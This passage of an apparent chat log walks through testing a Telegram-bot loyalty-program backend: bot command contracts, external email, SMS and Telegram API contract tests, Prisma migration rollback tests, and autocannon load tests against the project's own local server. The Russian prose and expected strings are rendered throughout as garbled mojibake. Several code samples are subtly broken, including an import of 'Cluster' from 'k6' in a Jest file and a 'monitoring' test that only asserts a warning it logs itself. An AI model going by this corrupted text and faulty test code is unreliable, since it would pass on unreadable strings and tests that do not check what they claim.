describe('Telegram Bot Commands - Contract Tests', () => {
  let app: INestApplication;
  let bot: any;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();

    bot = app.get('TELEGRAM_BOT');
  });

  afterAll(async () => {
    await app.close();
  });

  // Contract: /start command
  describe('/start command contract', () => {
    const startCommandContract = {
      command: '/start',
      response: {
        text: expect.stringContaining('ะะพะฑัะพ ะฟะพะถะฐะปะพะฒะฐัั'),
        reply_markup: {
          keyboard: [
            [{ text: '๐ฑ ะัะฟัะฐะฒะธัั ะฝะพะผะตั', request_contact: true }],
          ],
          resize_keyboard: true,
          one_time_keyboard: true,
        },
      },
    };

    it('should match /start command contract', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456, username: 'test_user' },
          text: '/start',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toEqual(startCommandContract.response.text);
      expect(response.reply_markup).toEqual(startCommandContract.response.reply_markup);
    });
  });

  // Contract: /balance command
  describe('/balance command contract', () => {
    const balanceCommandContract = {
      command: '/balance',
      response: {
        text: expect.stringMatching(/ะะฐั ะฑะฐะปะฐะฝั: \d+ ะฑะฐะปะปะพะฒ/),
        reply_markup: {
          inline_keyboard: [
            [
              { text: '๐ ะััะพัะธั', callback_data: 'history' },
              { text: '๐ ะะบัะธะธ', callback_data: 'promos' },
            ],
            [
              { text: '๐ณ ะะพั ะบะฐััะฐ', callback_data: 'card' },
            ],
          ],
        },
      },
    };

    it('should match /balance command contract', async () => {
      // Setup: create guest
      await prisma.user.create({
        data: {
          id: 'user-1',
          phone: '+79991234567',
          role: 'GUEST',
          phoneVerified: true,
          telegramId: '123456',
          guestProfile: { create: { firstName: 'ะะฒะฐะฝ' } },
          guestCards: {
            create: {
              id: 'card-1',
              tenantId: 'tenant-1',
              totalBalance: 1500,
              qrCode: 'qr-1.png',
              displayCode: '123456',
              status: 'ACTIVE',
            },
          },
        },
      });

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/balance',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toMatch(balanceCommandContract.response.text);
      expect(response.reply_markup).toEqual(balanceCommandContract.response.reply_markup);
    });
  });

  // Contract: /history command with pagination
  describe('/history command contract', () => {
    const historyCommandContract = {
      command: '/history',
      response: {
        text: expect.stringContaining('ะััะพัะธั ะพะฟะตัะฐัะธะน'),
        parse_mode: 'Markdown',
        reply_markup: {
          inline_keyboard: [
            [
              { text: 'โ๏ธ ะะฐะทะฐะด', callback_data: 'history_page_0' },
              { text: '1/3', callback_data: 'history_current' },
              { text: 'ะะฟะตััะด โถ๏ธ', callback_data: 'history_page_2' },
            ],
          ],
        },
      },
    };

    it('should match /history command contract', async () => {
      // Setup: create transactions
      const guestCard = await prisma.guestCard.create({
        data: {
          id: 'card-1',
          userId: 'user-1',
          tenantId: 'tenant-1',
          totalBalance: 500,
          qrCode: 'qr-1',
          displayCode: '123456',
          status: 'ACTIVE',
        },
      });

      await prisma.ballTransaction.createMany({
        data: Array(30).fill(null).map((_, i) => ({
          id: `tx-${i}`,
          guestCardId: guestCard.id,
          amount: 100,
          source: 'POS_WEBHOOK',
          sourceId: `CHK-${i}`,
          status: 'COMPLETED',
          earnedAt: new Date(),
        })),
      });

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/history',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('ะััะพัะธั ะพะฟะตัะฐัะธะน');
      expect(response.parse_mode).toBe('Markdown');
      expect(response.reply_markup.inline_keyboard[0]).toHaveLength(3); // Pagination buttons
    });
  });

  // Contract: Deprecated command with migration notice
  describe('deprecated /stats command', () => {
    it('should return migration notice for deprecated command', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/stats', // Deprecated command
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('ะะพะผะฐะฝะดะฐ /stats ะฑะพะปััะต ะฝะต ะฟะพะดะดะตัะถะธะฒะฐะตััั');
      expect(response.text).toContain('ะัะฟะพะปัะทัะนัะต /balance');
      expect(response.reply_markup.inline_keyboard[0][0]).toMatchObject({
        text: '๐ ะะตัะตะนัะธ ะบ ะฑะฐะปะฐะฝัั',
        callback_data: 'migrate_to_balance',
      });
    });
  });

  // Contract: Error handling
  describe('error handling contract', () => {
    it('should return user-friendly error for unknown command', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/unknown_command',
          chat: { id: 123456 },
        },
      });

      expect(response.text).toContain('ะะตะธะทะฒะตััะฝะฐั ะบะพะผะฐะฝะดะฐ');
      expect(response.reply_markup.inline_keyboard).toContainEqual([
        { text: '๐ฑ ะะปะฐะฒะฝะพะต ะผะตะฝั', callback_data: 'main_menu' },
      ]);
    });

    it('should return error for unauthorized user', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 999999 }, // Not registered
          text: '/balance',
          chat: { id: 999999 },
        },
      });

      expect(response.text).toContain('ะั ะฝะต ะทะฐัะตะณะธัััะธัะพะฒะฐะฝั');
      expect(response.reply_markup.inline_keyboard).toContainEqual([
        { text: '๐ ะะตะณะธัััะฐัะธั', callback_data: 'register' },
      ]);
    });
  });

  // Contract: Inline keyboard callback data format
  describe('callback data format contract', () => {
    it('should use consistent callback_data format', async () => {
      const callbackDataFormats = [
        // Format: action
        { pattern: /^[a-z_]+$/, example: 'history', valid: true },
        
        // Format: action_param
        { pattern: /^[a-z_]+_[a-z0-9]+$/, example: 'history_page_2', valid: true },
        
        // Format: action_id_param
        { pattern: /^[a-z_]+_[a-f0-9-]+_[a-z0-9]+$/, example: 'promo_550e8400_view', valid: true },
      ];

      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/balance',
          chat: { id: 123456 },
        },
      });

      // Validate all callback_data matches format
      const buttons = response.reply_markup.inline_keyboard.flat();
      
      for (const button of buttons) {
        const isValid = callbackDataFormats.some(format =>
          format.pattern.test(button.callback_data)
        );

        expect(isValid).toBe(true);
      }
    });
  });

  // Schema snapshot testing
  describe('command response schema snapshots', () => {
    it('should match saved snapshot for /start', async () => {
      const response = await bot.handleUpdate({
        message: {
          from: { id: 123456 },
          text: '/start',
          chat: { id: 123456 },
        },
      });

      const schema = {
        text: typeof response.text,
        reply_markup: {
          keyboard: response.reply_markup.keyboard.map(row =>
            row.map(btn => ({
              text: typeof btn.text,
              request_contact: typeof btn.request_contact,
            }))
          ),
        },
      };

      expect(schema).toMatchSnapshot();
    });
  });

  // Contract monitoring in production
  describe('contract violation monitoring', () => {
    it('should log contract violations', async () => {
      const logger = app.get('Logger');
      jest.spyOn(logger, 'warn');

      // Simulate response that violates contract
      const invalidResponse = {
        text: 'ะะฐั ะฑะฐะปะฐะฝั: 1500', // Missing " ะฑะฐะปะปะพะฒ" suffix
        reply_markup: {
          inline_keyboard: [], // Missing buttons
        },
      };

      // Validate against contract
      const expectedPattern = /ะะฐั ะฑะฐะปะฐะฝั: \d+ ะฑะฐะปะปะพะฒ/;
      
      if (!expectedPattern.test(invalidResponse.text)) {
        logger.warn('Contract violation: /balance text format');
      }

      expect(logger.warn).toHaveBeenCalledWith(
        expect.stringContaining('Contract violation')
      );
    });
  });
});
```


***

### **19. External API Changes - ะผะพะฝะธัะพัะธะฝะณ?**

**ะะพะฝัะตะบัั:** Resend Email API ะผะพะถะตั ะธะทะผะตะฝะธัั response format.

**ะะพะฟัะพั:** ะะฐะบ ะพะฑะฝะฐััะถะธัั?

- A) ะะฐะดะตััััั ััะพ ะฝะต ะธะทะผะตะฝัั
- B) Contract tests ั actual API (ะฝะต mock)
- C) B + automated tests ะฒ CI/CD (daily)
- D) C + fallback provider (SendGrid) ะตัะปะธ Resend unavailable

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- External APIs ะผะตะฝััััั ะฑะตะท notice
- Daily contract tests ะปะพะฒัั ะธะทะผะตะฝะตะฝะธั ัะฐะฝะพ
- Fallback provider = production resilience

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/contract/external-apis.contract.spec.ts
describe('External API Contract Tests', () => {
  let app: INestApplication;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.init();
  });

  afterAll(async () => {
    await app.close();
  });

  // Resend Email API contract
  describe('Resend Email API', () => {
    it('should match Resend API response schema', async () => {
      const resendService = app.get('ResendService');

      // Make actual API call (not mock!)
      const response = await resendService.send({
        to: 'test@example.com',
        from: 'noreply@max-loyalty.com',
        subject: 'Contract Test',
        html: '<p>Test email</p>',
      });

      // Expected schema
      expect(response).toMatchObject({
        id: expect.stringMatching(/^[a-f0-9-]+$/), // UUID format
        from: 'noreply@max-loyalty.com',
        to: ['test@example.com'],
        created_at: expect.any(String), // ISO date
      });

      // Save snapshot for comparison
      const fs = require('fs');
      const snapshotPath = './test/snapshots/resend-response.json';
      
      if (fs.existsSync(snapshotPath)) {
        const previousSnapshot = JSON.parse(fs.readFileSync(snapshotPath, 'utf8'));
        
        // Compare schemas (not values)
        const currentSchema = getObjectSchema(response);
        const previousSchema = getObjectSchema(previousSnapshot);

        expect(currentSchema).toEqual(previousSchema);
      } else {
        // First run: save snapshot
        fs.writeFileSync(snapshotPath, JSON.stringify(response, null, 2));
      }
    });

    it('should handle Resend API error format', async () => {
      const resendService = app.get('ResendService');

      try {
        await resendService.send({
          to: 'invalid-email', // Invalid
          from: 'noreply@max-loyalty.com',
          subject: 'Test',
          html: '<p>Test</p>',
        });
      } catch (error) {
        // Expected error schema
        expect(error.response).toMatchObject({
          statusCode: expect.any(Number),
          message: expect.any(String),
          name: expect.stringMatching(/^[A-Z_]+$/),
        });
      }
    });
  });

  // Telegram Bot API contract
  describe('Telegram Bot API', () => {
    it('should match Telegram sendMessage response', async () => {
      const telegramService = app.get('TelegramService');

      const response = await telegramService.sendMessage({
        chat_id: process.env.TEST_TELEGRAM_CHAT_ID,
        text: 'Contract test',
      });

      expect(response).toMatchObject({
        ok: true,
        result: {
          message_id: expect.any(Number),
          date: expect.any(Number),
          chat: {
            id: expect.any(Number),
            type: expect.any(String),
          },
          text: 'Contract test',
        },
      });
    });

    it('should handle Telegram API rate limit error', async () => {
      const telegramService = app.get('TelegramService');

      // Send 30 messages rapidly (trigger rate limit)
      const promises = Array(30).fill(null).map(() =>
        telegramService.sendMessage({
          chat_id: process.env.TEST_TELEGRAM_CHAT_ID,
          text: 'Rate limit test',
        })
      );

      try {
        await Promise.all(promises);
      } catch (error) {
        expect(error.response).toMatchObject({
          ok: false,
          error_code: 429,
          description: expect.stringContaining('Too Many Requests'),
          parameters: {
            retry_after: expect.any(Number),
          },
        });
      }
    });
  });

  // SMS.ru API contract
  describe('SMS.ru API', () => {
    it('should match SMS.ru response format', async () => {
      const smsService = app.get('SmsService');

      const response = await smsService.send({
        phone: '+79991234567',
        message: 'Contract test',
      });

      expect(response).toMatchObject({
        status: expect.stringMatching(/^(OK|ERROR)$/),
        status_code: expect.any(Number),
        sms: {
          ['+79991234567']: {
            status: expect.stringMatching(/^(OK|ERROR)$/),
            status_code: expect.any(Number),
            sms_id: expect.any(String),
          },
        },
        balance: expect.any(Number),
      });
    });
  });

  // Fallback provider test
  describe('Fallback Provider', () => {
    it('should fallback to SendGrid if Resend fails', async () => {
      const emailService = app.get('EmailService');

      // Mock Resend failure
      const resendService = app.get('ResendService');
      jest.spyOn(resendService, 'send').mockRejectedValue(new Error('503 Service Unavailable'));

      // Mock SendGrid success
      const sendGridService = app.get('SendGridService');
      jest.spyOn(sendGridService, 'send').mockResolvedValue({ success: true });

      const result = await emailService.send({
        to: 'test@example.com',
        subject: 'Test',
        html: '<p>Test</p>',
      });

      expect(result.provider).toBe('sendgrid');
      expect(sendGridService.send).toHaveBeenCalled();
    });
  });
});

// Helper function
function getObjectSchema(obj: any): any {
  if (Array.isArray(obj)) {
    return obj.length > 0 ? [getObjectSchema(obj[0])] : [];
  }
  
  if (typeof obj === 'object' && obj !== null) {
    const schema: any = {};
    for (const key in obj) {
      schema[key] = getObjectSchema(obj[key]);
    }
    return schema;
  }
  
  return typeof obj;
}
```

**CI/CD configuration (GitHub Actions):**

```yaml
# .github/workflows/contract-tests.yml
name: Contract Tests

on:
  schedule:
    - cron: '0 9 * * *' # Daily at 9:00 UTC
  workflow_dispatch: # Manual trigger

jobs:
  contract-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
      
      - name: Setup Node.js
        uses: actions/setup-node@v3
        with:
          node-version: '20'
      
      - name: Install dependencies
        run: npm ci
      
      - name: Run contract tests
        env:
          RESEND_API_KEY: ${{ secrets.RESEND_API_KEY }}
          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
          SMS_RU_API_KEY: ${{ secrets.SMS_RU_API_KEY }}
        run: npm run test:contract
      
      - name: Compare schemas with snapshots
        run: node scripts/compare-api-schemas.js
      
      - name: Send alert on contract violation
        if: failure()
        uses: slackapi/slack-github-action@v1
        with:
          webhook-url: ${{ secrets.SLACK_WEBHOOK_URL }}
          payload: |
            {
              "text": "๐จ External API contract violation detected!",
              "blocks": [
                {
                  "type": "section",
                  "text": {
                    "type": "mrkdwn",
                    "text": "*Contract Test Failed*\nExternal API schema has changed. Review logs for details."
                  }
                }
              ]
            }
```


***

### **20. Database Schema Changes - migration tests?**

**ะะพะฝัะตะบัั:** Prisma migration ะดะพะฑะฐะฒะปัะตั ะฝะพะฒะพะต ะฟะพะปะต.

**ะะพะฟัะพั:** ะะฐะบ ัะตััะธัะพะฒะฐัั?

- A) ะัะธะผะตะฝะธัั migration ะฒ dev โ manual test
- B) Automated test: apply migration โ rollback โ re-apply
- C) B + ะฟัะพะฒะตัะธัั ััะพ ะดะฐะฝะฝัะต ะฝะต ะฟะพัะตััะปะธัั
- D) C + ัะตััะธัะพะฒะฐัั ะฝะฐ production-like dataset (1M rows)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Migration rollback ะบัะธัะธัะตะฝ ะดะปั production safety
- Data loss = catastrophic failure
- Large dataset testing ะฝะฐัะพะดะธั performance issues

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/contract/database-migrations.spec.ts
describe('Database Migration Contract Tests', () => {
  let prisma: PrismaClient;

  beforeAll(async () => {
    prisma = new PrismaClient({
      datasources: { db: { url: process.env.TEST_DATABASE_URL } },
    });
  });

  afterAll(async () => {
    await prisma.$disconnect();
  });

  describe('Migration: Add loyaltyLevel field to GuestCard', () => {
    it('should apply migration successfully', async () => {
      // Run migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify schema updated
      const tableInfo = await prisma.$queryRaw`
        SELECT column_name, data_type, is_nullable
        FROM information_schema.columns
        WHERE table_name = 'GuestCard' AND column_name = 'loyaltyLevelId';
      `;

      expect(tableInfo).toHaveLength(1);
      expect(tableInfo[0]).toMatchObject({
        column_name: 'loyaltyLevelId',
        data_type: 'text',
        is_nullable: 'YES',
      });
    });

    it('should rollback migration without data loss', async () => {
      // Create test data
      const testData = await prisma.guestCard.create({
        data: {
          id: 'card-1',
          userId: 'user-1',
          tenantId: 'tenant-1',
          totalBalance: 1500,
          qrCode: 'qr-1',
          displayCode: '123456',
          status: 'ACTIVE',
        },
      });

      // Rollback migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate resolve --rolled-back 20260212_add_loyalty_level', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify data still exists
      const card = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
      expect(card.totalBalance).toBe(1500);
    });

    it('should re-apply migration successfully', async () => {
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Verify field exists again
      const card = await prisma.guestCard.findUnique({ where: { id: 'card-1' } });
      expect(card).toHaveProperty('loyaltyLevelId');
    });
  });

  // Test: Migration performance on large dataset
  describe('Migration Performance', () => {
    it('should handle migration on 1M rows', async () => {
      jest.setTimeout(300000); // 5 minutes

      // Create 1M guest cards
      console.log('Creating 1M guest cards...');
      const batchSize = 10000;
      
      for (let i = 0; i < 100; i++) {
        const data = Array(batchSize).fill(null).map((_, j) => ({
          id: `card-${i * batchSize + j}`,
          userId: `user-${i * batchSize + j}`,
          tenantId: 'tenant-1',
          totalBalance: Math.floor(Math.random() * 5000),
          qrCode: `qr-${i * batchSize + j}`,
          displayCode: String(i * batchSize + j).padStart(6, '0'),
          status: 'ACTIVE',
        }));

        await prisma.guestCard.createMany({ data });
        
        if (i % 10 === 0) {
          console.log(`Progress: ${i + 1}/100 batches`);
        }
      }

      console.log('Running migration...');
      const startTime = Date.now();

      // Run migration (add index on loyaltyLevelId)
      await prisma.$executeRaw`
        CREATE INDEX CONCURRENTLY IF NOT EXISTS idx_guest_card_loyalty_level
        ON "GuestCard" ("loyaltyLevelId");
      `;

      const duration = Date.now() - startTime;
      console.log(`Migration completed in ${duration}ms`);

      // Should complete in < 60 seconds
      expect(duration).toBeLessThan(60000);
    });
  });

  // Test: Data integrity after migration
  describe('Data Integrity', () => {
    it('should preserve all existing data', async () => {
      // Snapshot data before migration
      const beforeSnapshot = await prisma.guestCard.findMany({
        select: { id: true, totalBalance: true, totalSpent: true },
      });

      // Run migration
      const { execSync } = require('child_process');
      execSync('npx prisma migrate deploy', {
        env: { ...process.env, DATABASE_URL: process.env.TEST_DATABASE_URL },
      });

      // Snapshot data after migration
      const afterSnapshot = await prisma.guestCard.findMany({
        select: { id: true, totalBalance: true, totalSpent: true },
      });

      // Compare snapshots
      expect(afterSnapshot).toHaveLength(beforeSnapshot.length);
      
      for (const before of beforeSnapshot) {
        const after = afterSnapshot.find(a => a.id === before.id);
        expect(after).toMatchObject(before);
      }
    });
  });
});
```


***

ะัะพะดะพะปะถะฐั ั **Load \& Performance Testing (ะฒะพะฟัะพัั 21-30)**? ๐

---

# ะัะพะดะพะปะถะฐะน

ะัะพะดะพะปะถะฐั! ๐

***

## **ะะะะ 5: LOAD \& PERFORMANCE TESTING (10 ะฒะพะฟัะพัะพะฒ)**


***

### **21. Webhook Throughput - ัะบะพะปัะบะพ webhooks/sec?**

**ะะพะฝัะตะบัั:** ะะตััะพัะฐะฝ ะฒ ัะฐั ะฟะธะบ = 100 ััะฐะฝะทะฐะบัะธะน/ะผะธะฝััั.

**ะะพะฟัะพั:** ะัะถะตะฝ ะปะธ load test?

- A) ะะตั, ะดะพััะฐัะพัะฝะพ production monitoring
- B) ะะฐ, simulate 100 webhooks/min
- C) B + simulate 1000 webhooks/min (10x peak)
- D) C + ะฟัะพะฒะตัะธัั latency (p50, p95, p99)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- 10x peak testing ะฝะฐัะพะดะธั bottlenecks ะดะพ production
- Latency percentiles (p95, p99) ะฟะพะบะฐะทัะฒะฐัั worst-case performance
- Production monitoring ะะ ะะะะะะฏะะข load testing

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/load/webhook-throughput.load.spec.ts
import autocannon from 'autocannon';

describe('Webhook Throughput - Load Testing', () => {
  let app: INestApplication;
  let baseUrl: string;

  beforeAll(async () => {
    const moduleRef = await Test.createTestingModule({
      imports: [AppModule],
    }).compile();

    app = moduleRef.createNestApplication();
    await app.listen(0); // Random port

    const address = app.getHttpServer().address();
    baseUrl = `http://localhost:${address.port}`;
  });

  afterAll(async () => {
    await app.close();
  });

  // Test 1: Expected Load (100 webhooks/min)
  it('should handle 100 webhooks/min (expected load)', async () => {
    jest.setTimeout(120000); // 2 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 10, // Concurrent connections
      duration: 60, // 60 seconds
      amount: 100, // 100 requests total
      setupClient: (client) => {
        // Each request has unique posCheckId
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Expected Load (100 req/min) ===');
    console.log(`Requests: ${result.requests.total}`);
    console.log(`Duration: ${result.duration}s`);
    console.log(`Throughput: ${result.requests.average} req/sec`);
    console.log(`Latency p50: ${result.latency.p50}ms`);
    console.log(`Latency p95: ${result.latency.p95}ms`);
    console.log(`Latency p99: ${result.latency.p99}ms`);
    console.log(`Errors: ${result.errors}`);

    // Assertions
    expect(result.requests.total).toBe(100);
    expect(result.errors).toBe(0);
    expect(result.latency.p95).toBeLessThan(500); // p95 < 500ms
    expect(result.latency.p99).toBeLessThan(1000); // p99 < 1s
  });

  // Test 2: Peak Load (1000 webhooks/min = 10x)
  it('should handle 1000 webhooks/min (10x peak)', async () => {
    jest.setTimeout(180000); // 3 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 50,
      duration: 60,
      amount: 1000,
      setupClient: (client) => {
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Peak Load (1000 req/min = 10x) ===');
    console.log(`Requests: ${result.requests.total}`);
    console.log(`Throughput: ${result.requests.average} req/sec`);
    console.log(`Latency p50: ${result.latency.p50}ms`);
    console.log(`Latency p95: ${result.latency.p95}ms`);
    console.log(`Latency p99: ${result.latency.p99}ms`);
    console.log(`Errors: ${result.errors}`);

    // More lenient for peak load
    expect(result.errors).toBeLessThan(10); // < 1% error rate
    expect(result.latency.p95).toBeLessThan(2000); // p95 < 2s
    expect(result.latency.p99).toBeLessThan(5000); // p99 < 5s
  });

  // Test 3: Stress Test (until failure)
  it('should find breaking point', async () => {
    jest.setTimeout(300000); // 5 minutes

    let maxThroughput = 0;
    let breakingPoint = 0;

    // Gradually increase load until failure
    for (let connections = 10; connections <= 200; connections += 20) {
      console.log(`\nTesting with ${connections} concurrent connections...`);

      const result = await autocannon({
        url: `${baseUrl}/webhooks/transaction`,
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-Webhook-Signature': generateSignature(),
        },
        body: JSON.stringify({
          posSystem: 'IIKO_CLOUD',
          posCheckId: generateCheckId(),
          tenantId: 'tenant-1',
          checkAmount: 2850,
          guestPhone: '+79991234567',
          timestamp: new Date().toISOString(),
        }),
        connections,
        duration: 30,
        setupClient: (client) => {
          client.on('request', (req) => {
            req.body = JSON.stringify({
              ...JSON.parse(req.body),
              posCheckId: generateCheckId(),
            });
          });
        },
      });

      const errorRate = (result.errors / result.requests.total) * 100;
      const throughput = result.requests.average;

      console.log(`Throughput: ${throughput} req/sec`);
      console.log(`Error rate: ${errorRate.toFixed(2)}%`);
      console.log(`Latency p99: ${result.latency.p99}ms`);

      if (errorRate > 5 || result.latency.p99 > 10000) {
        // Breaking point: > 5% errors or p99 > 10s
        breakingPoint = connections;
        console.log(`\n๐ด Breaking point: ${connections} connections`);
        break;
      }

      maxThroughput = Math.max(maxThroughput, throughput);
    }

    console.log(`\n=== Stress Test Results ===`);
    console.log(`Max throughput: ${maxThroughput} req/sec`);
    console.log(`Breaking point: ${breakingPoint} concurrent connections`);

    // Should handle at least 100 concurrent connections
    expect(breakingPoint).toBeGreaterThanOrEqual(100);
  });

  // Test 4: Sustained Load (soak test)
  it('should handle sustained load for 10 minutes', async () => {
    jest.setTimeout(660000); // 11 minutes

    const result = await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 20,
      duration: 600, // 10 minutes
      setupClient: (client) => {
        client.on('request', (req) => {
          req.body = JSON.stringify({
            ...JSON.parse(req.body),
            posCheckId: generateCheckId(),
          });
        });
      },
    });

    console.log('=== Sustained Load (10 min) ===');
    console.log(`Total requests: ${result.requests.total}`);
    console.log(`Average throughput: ${result.requests.average} req/sec`);
    console.log(`Errors: ${result.errors}`);
    console.log(`Latency p99: ${result.latency.p99}ms`);

    // Should maintain performance over time (no memory leaks)
    expect(result.errors).toBeLessThan(result.requests.total * 0.01); // < 1% error rate
    expect(result.latency.p99).toBeLessThan(2000); // p99 stable
  });

  // Test 5: Resource Monitoring
  it('should monitor CPU and memory during load', async () => {
    const pidusage = require('pidusage');
    const stats: any[] = [];

    // Start monitoring
    const interval = setInterval(async () => {
      const usage = await pidusage(process.pid);
      stats.push({
        timestamp: Date.now(),
        cpu: usage.cpu,
        memory: usage.memory / 1024 / 1024, // MB
      });
    }, 1000);

    // Run load test
    await autocannon({
      url: `${baseUrl}/webhooks/transaction`,
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-Webhook-Signature': generateSignature(),
      },
      body: JSON.stringify({
        posSystem: 'IIKO_CLOUD',
        posCheckId: generateCheckId(),
        tenantId: 'tenant-1',
        checkAmount: 2850,
        guestPhone: '+79991234567',
        timestamp: new Date().toISOString(),
      }),
      connections: 50,
      duration: 60,
    });

    clearInterval(interval);

    // Analyze stats
    const avgCpu = stats.reduce((sum, s) => sum + s.cpu, 0) / stats.length;
    const maxCpu = Math.max(...stats.map(s => s.cpu));
    const avgMemory = stats.reduce((sum, s) => sum + s.memory, 0) / stats.length;
    const maxMemory = Math.max(...stats.map(s => s.memory));

    console.log('=== Resource Usage ===');
    console.log(`Avg CPU: ${avgCpu.toFixed(2)}%`);
    console.log(`Max CPU: ${maxCpu.toFixed(2)}%`);
    console.log(`Avg Memory: ${avgMemory.toFixed(2)} MB`);
    console.log(`Max Memory: ${maxMemory.toFixed(2)} MB`);

    // Assertions
    expect(maxCpu).toBeLessThan(80); // CPU < 80%
    expect(maxMemory).toBeLessThan(1024); // Memory < 1GB
  });
});

// Helper functions
function generateCheckId(): string {
  return `CHK-${Date.now()}-${Math.random().toString(36).substr(2, 9)}`;
}

function generateSignature(): string {
  return 'mock-signature-for-testing';
}
```

**package.json:**

```json
{
  "devDependencies": {
    "autocannon": "^7.14.0",
    "pidusage": "^3.0.2"
  },
  "scripts": {
    "test:load": "jest --testMatch='**/*.load.spec.ts' --runInBand"
  }
}
```

**Artillery alternative (YAML config):**

```yaml
# test/load/webhook-throughput.yml
config:
  target: "http://localhost:3000"
  phases:
    # Warm-up
    - duration: 60
      arrivalRate: 5
      name: "Warm-up"
    
    # Ramp-up
    - duration: 300
      arrivalRate: 5
      rampTo: 50
      name: "Ramp-up to peak"
    
    # Sustained peak
    - duration: 600
      arrivalRate: 50
      name: "Sustained peak load"
    
    # Spike
    - duration: 60
      arrivalRate: 200
      name: "Spike test"

  defaults:
    headers:
      Content-Type: "application/json"
      X-Webhook-Signature: "mock-signature"

scenarios:
  - name: "POS Webhook"
    flow:
      - post:
          url: "/webhooks/transaction"
          json:
            posSystem: "IIKO_CLOUD"
            posCheckId: "{{ $randomString() }}"
            tenantId: "tenant-1"
            checkAmount: 2850
            guestPhone: "+79991234567"
            timestamp: "{{ $timestamp() }}"
```


***

### **22. Concurrent User Load - ัะบะพะปัะบะพ ะพะดะฝะพะฒัะตะผะตะฝะฝัั ะฟะพะปัะทะพะฒะฐัะตะปะตะน?**

**ะะพะฝัะตะบัั:** Black Friday โ 1000 ะณะพััะตะน ะพะดะฝะพะฒัะตะผะตะฝะฝะพ ะพัะบััะฒะฐัั Telegram Mini App.

**ะะพะฟัะพั:** Load test ััะตะฝะฐัะธะน?

- A) 10 concurrent users (smoke test)
- B) 100 concurrent users (expected load)
- C) 1000 concurrent users (peak load)
- D) C + 5000 users (stress test ะดะพ failure)

**ะะะ ะะซะะะ: D**

**ะะะะกะะะะะะะ:**

- Black Friday = ัะตะฐะปัะฝัะน ััะตะฝะฐัะธะน ั ะฟะธะบะพะฒะพะน ะฝะฐะณััะทะบะพะน
- Stress testing ะฝะฐัะพะดะธั limits ะดะพ production crash
- 5000 users = 5x peak testing

**ะะะะะะะะฆะะฏ:**

```typescript
// apps/backend/test/load/concurrent-users.load.spec.ts
import { Cluster } from 'k6';

describe('Concurrent User Load Testing', () => {
  // Test 1: Smoke Test (10 users)
  it('should handle 10 concurrent users', async () => {
    const result = await runK6Script({
      vus: 10, // Virtual users
      duration: '30s',
      script: userJourneyScript,
    });

    expect(result.metrics.http_req_failed.rate).toBeLessThan(0.01); // < 1% failure
    expect(result.metrics.http_req_duration.p95).toBeLessThan(500); // p95 < 500ms
  });

  // Test 2: Expected Load (100 users)
  it('should handle 100 concurrent users', async () => {
    const result = await runK6Script({
      vus: 100,
      duration: '5m',
      script: userJourneyScript,
    });

    console.log('=== 100 Concurrent Users ===');
    console.log(`Requests: ${result.metrics.http_reqs.count}`);
    console.log(`Failed: ${result.metrics.http_req_failed.count}`);
    console.log(`p95 latency: ${result.metrics.http_req_duration.p95}ms`);
